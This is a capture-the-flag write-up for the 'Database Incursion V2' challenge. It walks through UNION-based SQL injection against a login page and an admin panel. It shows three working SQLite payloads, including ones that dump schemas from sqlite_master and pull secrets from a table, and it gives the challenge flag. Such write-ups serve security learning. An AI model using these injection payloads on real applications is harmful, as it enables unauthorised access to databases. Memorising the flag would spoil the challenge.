# 1. Database Incursion V2

Directly access the challenge server at https://database-incursion-v2.nitephase.live/

## Solution:

- i used UNION operator based injections to get through the initial login page to get the employee list.Then as hinted i searched for Management department employee then found that Kiwi had the passcode but i found multiple Kiwis. So i filtered out the one from the Management and got the passcode to the admin panel.Then i figured out the number of columns as 4 and then i extracted the schemas. Then found that CITADEL_ARCHIVE_2077 had the flag so 


<img width="773" height="619" alt="image" src="https://github.com/user-attachments/assets/a6480a39-39f2-40ec-83c6-a34d811b3d23" />

For this payload 
```bash
' UNION SELECT ID, Name, Department, Email, Notes FROM employees WHERE Name LIKE '%Kiwi%' AND Department='Management' --
```

<img width="1887" height="493" alt="image" src="https://github.com/user-attachments/assets/ab2ed0fd-39e3-40e8-a164-947e244a9f87" />

The admin panel:
<img width="1899" height="740" alt="image" src="https://github.com/user-attachments/assets/ce5be425-fc94-45f9-8e6a-204831473325" />

<img width="1843" height="525" alt="image" src="https://github.com/user-attachments/assets/46db902e-444d-4b6f-8b24-d767c2a719e3" />

For this payload 
```bash
' UNION SELECT 1, name, sql, 'schema' FROM sqlite_master --
```
<img width="1883" height="592" alt="image" src="https://github.com/user-attachments/assets/e9e00859-8a52-40c8-9a3a-aeb544ab2150" />

For this payload 
```bash
' UNION SELECT secrets, 'archive data', '', '' FROM "CITADEL_ARCHIVE_2077" --
```
<img width="1849" height="498" alt="image" src="https://github.com/user-attachments/assets/b8774394-7669-4285-89a7-012176118a16" />

## Flag:

```
CITADEL{571ll_d0n7_kn0w_1f_175_53qu3l_0r_5ql?}
```

## Concepts learnt:

- I learned how to use specific sql injections after carefully understanding each error. 

## Notes:

- i kept trying with MySQL database injections but they kept failing so then changin those to SQLite worked.I assumed some number of columns without counting so that kept giving error.

## Resources:

-  (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)


